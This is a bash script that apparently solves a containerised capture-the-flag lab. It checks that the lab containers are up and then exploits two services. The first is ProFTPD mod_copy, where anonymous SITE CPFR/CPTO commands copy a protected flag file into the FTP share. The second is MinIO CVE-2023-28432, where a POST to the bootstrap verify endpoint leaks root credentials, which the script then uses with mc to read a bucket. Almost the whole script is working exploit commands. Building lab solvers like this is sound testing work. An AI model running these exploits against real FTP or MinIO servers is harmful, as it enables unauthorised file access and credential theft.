#!/usr/bin/env bash
set -euo pipefail

echo "[+] Check containers"
docker ps --format '{{.Names}}' | grep -q '^sentinel-dev01$'
docker ps --format '{{.Names}}' | grep -q '^sentinel-files01$'
docker ps --format '{{.Names}}' | grep -q '^sentinel-minio01$'

echo
echo "[+] Check reachability from dev01"
docker exec sentinel-dev01 ash -lc '
nc -vz 10.92.30.40 21
nc -vz 10.92.30.50 9000
'

echo
echo "[+] Exploit files01 ProFTPD mod_copy"
docker exec sentinel-dev01 ash -lc '
printf "USER anonymous\r\nPASS anonymous@\r\nSITE CPFR /flag.txt\r\nSITE CPTO /var/ftp/data/files01_flag.txt\r\nQUIT\r\n" \
  | nc 10.92.30.40 21
echo
echo "[files01 flag]"
curl -s --user anonymous:anonymous@ ftp://10.92.30.40/data/files01_flag.txt
echo
'

echo
echo "[+] Check MinIO CVE-2023-28432 env leak"
docker exec sentinel-dev01 ash -lc '
curl -s -X POST http://10.92.30.50:9000/minio/bootstrap/v1/verify \
  | grep -E "MINIO_ROOT_USER|MINIO_ROOT_PASSWORD|MinioEnv|MinioEndpoints" || true
'

echo
echo "[+] Read MinIO s3://flag/flag.txt"
docker run --rm --network container:sentinel-dev01 minio/mc:latest sh -lc '
mc alias set sentinel http://10.92.30.50:9000 minioadmin "MinioRoot-Sentinel!" >/dev/null
echo "[minio01 flag]"
mc cat sentinel/flag/flag.txt
echo
'
